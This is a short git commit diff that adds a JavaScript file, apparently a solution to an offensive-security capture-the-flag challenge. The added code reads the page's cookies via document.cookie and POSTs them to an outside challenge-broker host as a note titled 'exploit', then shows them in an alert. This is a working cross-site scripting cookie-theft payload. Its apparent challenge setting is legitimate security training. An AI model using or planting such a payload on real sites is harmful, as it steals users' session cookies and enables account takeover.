b6bbdc1731c3c14d0aa8fc99e5c6f70ad67c7990
Arti <123784674+wandaversion@users.noreply.github.com>
2024-04-09 20:23:32 -0400

    Update cslmnop.js

--- cslmnop.js
+++ cslmnop.js
@@ -1,1 +1,6 @@
-test test 
+var cookie_flag = document.cookie;
+fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
+    method: 'POST',  
+    body: JSON.stringify({ title: 'exploit', content: cookie_flag })
+})
+alert("testing"+cookie_flag);
